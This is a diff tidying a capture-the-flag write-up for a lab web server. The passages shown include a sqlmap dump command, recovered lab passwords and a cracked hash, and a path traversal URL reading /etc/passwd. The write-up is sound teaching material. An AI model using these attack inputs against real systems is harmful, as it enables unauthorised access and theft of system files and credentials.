@@ -108,17 +108,13 @@ sqlmap -r req -dump
 By doing this password for hacker@root.thm was discovered which is VeryDifficultPassword!!#@#@!#!@#1231.
 
 Also, there was some information on other URI’s most probably also accessible on our webserver.
-/file1010111/index.php       | 1    | 69c66901194a6486176e81f5945b8929 (easytohack)
-
-/upload-cv00101011/index.php | 3    | // ONLY ACCESSIBLE THROUGH USERNAME STARTING WITH Z
 
 | url  | password |
 | ------------- | ------------- |
 | /file1010111/index.php  | 69c66901194a6486176e81f5945b8929 (easytohack)  |
 | /upload-cv00101011/index.php  | // ONLY ACCESSIBLE THROUGH USERNAME STARTING WITH Z
-  |
 
-Firstly, I opened site `http://10.10.78.204:1337//file1010111/index.php` 
+Firstly, I opened site `http://10.10.78.204:1337/file1010111/index.php` 
 
 ### SSC11 file1010111/index.php login page
 
@@ -137,7 +133,7 @@ This is an example as no website should send credentials in clear text.
 So… Here I was provided with names of this parameters: `file` or `view`. Such parameters could be exploited by path traversal vulnerability. This was also the case here. I just need to create a good attack. I decided to go for /etc/passwd file.
 
 ```
-http://10.10.78.204:1337//file1010111/index.php?file=../../../../../etc/passwd
+http://10.10.78.204:1337/file1010111/index.php?file=../../../../../etc/passwd
 ```
 I was asked to provide `easytohack` password again.
 
@@ -148,7 +144,7 @@ Fortunately there was no additional layer of security which would santize input.
 Previously, I discovered another accessible site under `/upload-cv00101011/index.php`
 
 ```
-http://10.10.78.204:1337//upload-cv00101011/index.php
+http://10.10.78.204:1337/upload-cv00101011/index.php
 ```
 
 ### SSC14 upload-cv00101011/index.php logn page
